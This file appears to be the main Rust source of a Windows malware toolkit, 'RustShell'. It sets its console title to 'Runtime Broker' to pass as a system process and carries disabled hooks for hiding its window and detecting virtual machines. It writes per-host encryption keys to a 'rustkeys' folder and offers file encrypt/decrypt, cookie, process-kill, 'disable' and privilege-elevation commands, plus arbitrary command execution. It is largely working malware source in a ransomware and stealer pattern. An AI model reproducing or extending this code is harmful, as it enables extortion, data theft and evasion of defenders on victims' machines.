#![allow(non_snake_case)]

use std::{io::{self, Write, Read, stdout}, process::{Command}};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::wincon::SetConsoleTitleW;
use colored::*;
use std::{fs::{File, self}, path::{Path, PathBuf}};
use rand::{rngs::OsRng, RngCore};
use hex;
use gethostname::gethostname;

mod hide_window;
mod functions;
mod encrypt;
mod antivm;

fn main() -> Result<(), anyhow::Error> {
  // hides the cmd window
  // hide_window::hide_console_window();

  // Set the cmd window title
  let new_title = "Runtime Broker";
  let title: Vec<u16> = OsStr::new(new_title)
    .encode_wide()
    .chain(Some(0).into_iter())
    .collect();
  unsafe { 
    SetConsoleTitleW(title.as_ptr()) 
  };

  // Checks if the program is running in a VM
  //antivm::antivm();

  let mut key = [0u8; 32];
  let mut nonce = [0u8; 19];
  OsRng.fill_bytes(&mut key);
  OsRng.fill_bytes(&mut nonce);

  let key = hex::encode(key);
  let nonce = hex::encode(nonce);

  // Create the rustkeys folder if it doesn't exist
  let folder_name = "rustkeys";
  if !Path::new(folder_name).exists() {
    fs::create_dir(folder_name)?;
  }

  let hostname = gethostname().into_string().unwrap();

  // Create the CSV file with the hostname as its name
  let file_name = format!("{}.csv", hostname);
  let file_path = PathBuf::from(folder_name).join(file_name);

  // Check if the file already exists, and if it does, read the key and nonce from the file
  let mut key_from_file = String::new();
  let mut nonce_from_file = String::new();
  if let Ok(mut file) = File::open(&file_path) {
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    let parts: Vec<&str> = contents.trim().split(',').collect();
    nonce_from_file = parts[0].to_string();
    key_from_file = parts[1].to_string();
  }

  // If the file doesn't exist, or if the key or nonce are empty, use the generated key and nonce
  let key_to_use = if !key_from_file.is_empty() { 
    key_from_file 
  } else { 
    key 
  };
  let nonce_to_use = if !nonce_from_file.is_empty() { 
    nonce_from_file 
  } else { 
    nonce 
  };

  let mut file = File::create(&file_path)?;

  // Write the key and nonce to the CSV file
  writeln!(file, "{},{}", nonce_to_use, key_to_use)?;

  let key_to_use: [u8; 32] = hex::decode(key_to_use)?.try_into().unwrap();
  let nonce_to_use: [u8; 19] = hex::decode(nonce_to_use)?.try_into().unwrap();

  // Enable ANSI support for Windows 10
  ansi_term::enable_ansi_support().unwrap();

  // Clear the command prompt
  print!("{}[2J", 27 as char);
  stdout().flush().unwrap();

  let lines = [
    "    /$$$$$$$                        /$$      /$$$$$$  /$$                 /$$ /$$ ",
    "   | $$__  $$                      | $$     /$$__  $$| $$                | $$| $$ ",
    "   | $$  \\ $$ /$$   /$$  /$$$$$$$ /$$$$$$  | $$  \\__/| $$$$$$$   /$$$$$$ | $$| $$ ",
    "   | $$$$$$$/| $$  | $$ /$$_____/|_  $$_/  |  $$$$$$ | $$__  $$ /$$__  $$| $$| $$ ",
    "   | $$__  $$| $$  | $$|  $$$$$$   | $$     \\____  $$| $$  \\ $$| $$$$$$$$| $$| $$ ",
    "   | $$  \\ $$| $$  | $$ \\____  $$  | $$ /$$ /$$  \\ $$| $$  | $$| $$_____/| $$| $$ ",
    "   | $$  | $$|  $$$$$$/ /$$$$$$$/  |  $$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$ ",
    "   |__/  |__/ \\______/ |_______/    \\___/   \\______/ |__/  |__/ \\_______/|__/|__/ ",
    "",
  ];

  for line in &lines {
    println!("{}", line.truecolor(80, 12, 170));
  }

  loop {
    print!("{}", "        > ".truecolor(120, 120, 120));

    io::stdout().flush()?;

    let mut input = String::new();
    io::stdin().read_line(&mut input)?;

    let input = input.trim();

    let mut parts = input.splitn(2, ' ');
    let command = parts.next().unwrap_or("");

    if input.is_empty() {
      // If the user didn't enter any input, print the prompt again and continue
      io::stdout().flush()?;
      continue;
    }
    
    match command {
      "exit" | "quit" => {
        break;
      }
      "rm" | "del" => {
        functions::remove();
      }
      "tree" => {
        functions::tree()
      }
      "clear" | "cls" => {
        print!("{}[2J", 27 as char);
        stdout().flush().unwrap();
        for line in &lines {
          println!("{}", line.truecolor(80, 12, 170));
        }
      }
      "find" => {
        functions::find();
      }
      "where" => {
        functions::whereis();
      }
      "scan" => {
        functions::scan();
      }
      "cookies" => {
        //functions::cookies();
      }
      "encrypt" | "enc" => {
        encrypt::encrypt(
          &key_to_use,
          &nonce_to_use,
        )?;
      }
      "decrypt" | "dec" => {
        encrypt::decrypt(
          &key_to_use,
          &nonce_to_use,
        )?;
      }
      "help" => {
        functions::help();
      }
      "info" => {
        functions::info();
      }
      "kill" => {
        functions::kill();
      }
      "disable" => {
        functions::disable();
      }
      "elevate" => {
        functions::elevate();
      }
      _ => {
        let mut parts = input.split_whitespace();
        if let Some(command) = parts.next() {
          match Command::new(command).args(parts).output() {
            Ok(output) => {
              // Print the output of the command
              println!("{}", String::from_utf8_lossy(&output.stdout));
            },
            Err(error) => {
              // Print the error message
              eprintln!("    Failed to run command: {}", error);
            }
          }
        }
      }
    }
  }
  Ok(())
}
